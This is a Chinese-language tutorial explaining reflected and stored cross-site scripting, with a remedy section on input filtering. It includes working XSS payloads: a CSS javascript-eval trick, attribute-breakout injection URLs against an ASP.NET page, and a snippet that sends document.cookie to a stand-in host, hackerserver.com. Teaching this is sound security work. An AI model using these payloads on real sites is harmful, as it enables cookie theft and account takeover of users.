
跨站脚本攻击(Cross Site Scripting)
XSS攻击是Web攻击中最常见的攻击方法之一，它是通过对网页注入可执行代码且成功地被浏览器 执行，达到攻击的目的，形成了一次有效XSS攻击，一旦攻击成功，它可以获取用户的联系人列表，然后向联系人发送虚假诈骗信息，可以删除用户的日志等等，有时候还和其他攻击方式同时实 施比如SQL注入攻击服务器和数据库、Click劫持、相对链接劫持等实施钓鱼，它带来的危害是巨 大的，是web安全的头号大敌。

# 根据XSS攻击的效果可以分为几种类型

- XSS反射型攻击，恶意代码并没有保存在目标网站，通过引诱用户点击一个链接到目标网站的恶意链接来实施攻击的。
- XSS存储型攻击，恶意代码被保存到目标网站的服务器中，这种攻击具有较强的稳定性和持久性，比较常见场景是在博客，论坛等社交网站上，但OA系统，和CRM系统上也能看到它身影，比如：某CRM系统的客户投诉功能上存在XSS存储型漏洞，黑客提交了恶意攻击代码，当系统管理员查看投诉信息时恶意代码执行，窃取了客户的资料，然而管理员毫不知情，这就是典型的XSS存储型攻击。

# 攻击的条件
实施XSS攻击需要具备两个条件：

- 需要向web页面注入恶意代码；
- 这些恶意代码能够被浏览器成功的执行。

看一下下面这个例子：
```
  <div id="el" style="width:100px;height:100px;background:url('javascript:eval(document.getElementById(" el ").getAttribute("code ")) ')" code="var a = document.createElement('a');
    a.innerHTML= '执行了恶意代码';document.body.appendChild(a);"></div>
```
这段代码在旧版的IE8和IE8以下的版本都是可以被执行的，火狐也能执行代码，但火狐对其禁止访问DOM对象，所以在火狐下执行将会看到控制里抛出异常：document is not defined （document是没有定义的）

反射型的XSS攻击
```
<div>
  <img src="/images/handler.ashx?id=<%= Request.QueryString["id"] %>" />
</div>
```
当输入地址为`http://www.xxx.com/?id=" /><script>alert(/xss/)</script><br x="`时
```
<div>
  <img src="/images/handler.ashx?id=" /><script>alert(/xss/)</script><br x="" />
</div>
```
把ValidateRequest设置为true或者保持默认值并不能解决这个问题，这种情况还可以输入下面的地址达到相同的攻击效果：
```
http://www.xxx.com/?id=xx" onerror="this.onload()" onload="alert(/xss/)" x="
```

# XSS攻击能做些什么
1.窃取cookies，读取目标网站的cookie发送到黑客的服务器上，如下面的代码：
```
var i=document.createElement("img");
document.body.appendChild(i);
i.src = "http://www.hackerserver.com/?c=" + document.cookie;
```
2.读取用户未公开的资料，如果：邮件列表或者内容、系统的客户资料，联系人列表等等

# 解决方法
- 在表单提交或者url参数传递前，对需要的参数进行过滤
- 过滤用户输入的 检查用户输入的内容中是否有非法内容。如`<>`（尖括号）、”（引号）、 ‘（单引号）、%（百分比符号）、;（分号）、()（括号）、&（& 符号）、+（加号）等。、严格控制输出




